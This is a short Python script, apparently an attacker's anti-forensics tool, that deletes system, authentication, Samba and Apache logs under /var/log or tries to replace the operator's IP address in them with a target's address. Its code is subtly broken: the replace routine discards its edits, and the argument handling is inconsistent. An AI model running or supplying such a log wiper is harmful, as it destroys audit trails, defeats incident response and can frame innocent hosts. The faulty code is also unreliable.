# You need root privilege for this to work.

import fileinput
import sys
import os

TARGET_IP_ADDRESS = str(sys.argv[1])
MY_IP_ADDRESS = str(sys.argv[2])

LOG_FILES = (
    # System
    '/var/log/messages',
    '/var/log/daemon.log',
    '/var/log/auth.log',
    '/var/log/debug',
    '/var/log/kernel.log',
    '/var/log/syslog',
    # Application
    '/var/log/samba/log.nmbd',
    '/var/log/samba/log.smbd',
    f'/var/log/samba/log.{MY_IP_ADDRESS}',
    '/var/log/apache2/access.log',
    '/var/log/apache2/error.log'
)


def get_parser():
    """Get parser object"""
    from argparse import ArgumentParser, ArgumentDefaultsHelpFormatter, FileType
    parser = ArgumentParser(description=__doc__,
                            formatter_class=ArgumentDefaultsHelpFormatter)
    parser.add_argument("LHOST",
                        metavar="local IP address",
                        help="lhost")
    parser.add_argument("RHOST",
                        metavar="rhost",
                        help="remote IP address")
    parser.add_argument("-r", "--replace",
                        metavar="replace",
                        help="replace your IP address from logs with remote address")
    parser.add_argument("-d", "--delete",
                        metavar="delete",
                        help="Delete all logs")

    return parser


# Delete all logs
def delete():
    for root, dirs, files in os.walk('/var/log/'):
        for file in files:
            if 'log' in file:  # Remove log files and backups
                os.remove(os.path.join(root, file))
    for log_file in LOG_FILES:
        if os.path.exists(log_file):
            os.remove(log_file)


# Replaces logs with local IP address
def replace():
    for file in LOG_FILES:
        if os.path.exists(file):
            with fileinput.input(file) as file_input:
                for line in file_input:
                    if MY_IP_ADDRESS in line:
                        line.replace(MY_IP_ADDRESS, TARGET_IP_ADDRESS)


if __name__ == "__main__":
    args = get_parser().parse_args()
    if args.replace:
        replace()
    if args.delete:
        delete()
